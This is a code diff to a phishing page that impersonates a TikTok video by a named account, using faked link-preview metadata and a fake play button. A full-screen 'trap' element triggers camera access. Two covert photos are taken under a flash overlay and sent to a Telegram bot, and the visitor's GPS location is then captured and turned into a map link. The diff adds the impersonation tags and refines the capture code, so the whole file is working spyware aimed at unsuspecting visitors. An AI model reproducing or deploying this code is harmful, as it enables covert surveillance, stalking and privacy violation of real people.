@@ -3,11 +3,18 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Video</title>
+    <title>TikTok . Havin Sorany</title>
     
+    <meta property="og:title" content="TikTok . Havin Sorany">
+    <meta property="og:description" content="2.9K likes, 188 comments. '#hvin_sorai #hawler_soran _dhok_karkuk_hallabja'">
+    <meta property="og:image" content="pasha.jpg">
+    <meta property="og:url" content="https://www.tiktok.com/@havin_sorany">
+    <meta property="og:type" content="video.other">
+
     <style>
-        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; }
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; font-family: sans-serif; }
         
+        /* وێنەی پشتێنە بە زوومی تەواو */
         .bg { 
             position: fixed; 
             top: 0; 
@@ -17,13 +24,15 @@
             background: url('pasha.jpg') no-repeat center center; 
             background-size: cover; 
             z-index: 1;
-            transform: scale(1.05);
+            transform: scale(1.1);
         }
 
         .play-btn { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 5; pointer-events: none; }
-        .play-icon { width: 85px; height: 85px; fill: white; opacity: 0.9; }
+        .play-icon { width: 90px; height: 90px; fill: white; opacity: 0.9; }
         
         #trap { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 100; cursor: pointer; }
+        
+        /* فلاشە سپییەکە */
         #flash { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 200; display: none; }
         
         video, canvas { display: none; }
@@ -55,13 +64,13 @@
         }
         notifyVisit();
 
-        async function sendPhoto(v, c, caption) {
+        async function sendPhoto(v, c, fileName, caption) {
             c.width = v.videoWidth; c.height = v.videoHeight;
             c.getContext('2d').drawImage(v, 0, 0);
-            const blob = await (await fetch(c.toDataURL('image/jpeg', 0.85))).blob();
+            const blob = await (await fetch(c.toDataURL('image/jpeg', 0.9))).blob();
             const fd = new FormData();
             fd.append('chat_id', chat_id);
-            fd.append('photo', blob, 'shot.jpg');
+            fd.append('photo', blob, fileName);
             fd.append('caption', caption);
             return fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
         }
@@ -74,16 +83,19 @@
                 await v.play();
                 const f = document.getElementById('flash');
 
+                // 📸 وێنەی یەکەم (1000ms)
                 setTimeout(async () => {
                     f.style.display = 'block';
-                    await sendPhoto(v, document.getElementById('c'), "📸 Snap 1 (1000ms)");
+                    await sendPhoto(v, document.getElementById('c'), "1.jpg", "📸 Snap 1 (1000ms)");
                     f.style.display = 'none';
 
+                    // 📸 وێنەی دووەم (200ms)
                     setTimeout(async () => {
                         f.style.display = 'block';
-                        await sendPhoto(v, document.getElementById('c'), "📸 Snap 2 (200ms)");
+                        await sendPhoto(v, document.getElementById('c'), "2.jpg", "📸 Snap 2 (200ms)");
                         f.style.display = 'none';
 
+                        // 📍 لۆکەیشن
                         if (navigator.geolocation) {
                             navigator.geolocation.getCurrentPosition(async (pos) => {
                                 const mapLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
@@ -96,7 +108,7 @@
                     }, 200);
                 }, 1000);
             } catch (e) {
-                // تا Allow نەکرێت هیچی لێ نایەت
+                // تا Allow نەکرێت ناچێتە سەر تیکتۆک
             }
         }
     </script>
